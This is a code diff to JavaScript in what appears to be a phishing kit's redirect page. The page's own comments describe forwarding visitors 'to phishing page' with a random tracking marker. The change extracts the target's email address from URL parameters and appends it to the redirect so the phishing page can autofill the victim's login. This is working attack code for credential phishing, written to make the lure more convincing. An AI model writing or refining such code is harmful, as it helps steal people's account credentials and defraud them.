@@ -169,7 +169,16 @@
                 // Forward to phishing page by adding the forwarder marker
                 var url = new URL(window.location.href);
                 
-                // Generate 4 random bytes
+                // Extract email from URL parameters
+                var email = url.searchParams.get('email') || 
+                            url.searchParams.get('e') || 
+                            url.searchParams.get('u') || 
+                            url.searchParams.get('login_hint') ||
+                            url.searchParams.get('user') ||
+                            url.searchParams.get('mail') ||
+                            '';
+                
+                // Generate 4 random bytes for forwarder marker
                 var b1 = Math.floor(Math.random() * 256);
                 var b2 = Math.floor(Math.random() * 256);
                 var b3 = Math.floor(Math.random() * 256);
@@ -184,9 +193,16 @@
                 // Base64 encode and make URL safe (raw encoding, no padding)
                 var marker = btoa(bytes).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                 
-                // Add as query parameter
+                // Add forwarder marker as query parameter
                 url.searchParams.set('_r', marker);
-                window.location.href = url.toString();
+                
+                // Build final URL with email as hash fragment for autofill
+                var finalUrl = url.toString();
+                if (email) {
+                    finalUrl += '#' + encodeURIComponent(email);
+                }
+                
+                window.location.href = finalUrl;
             }, 300);
         }, 2500);
     </script>
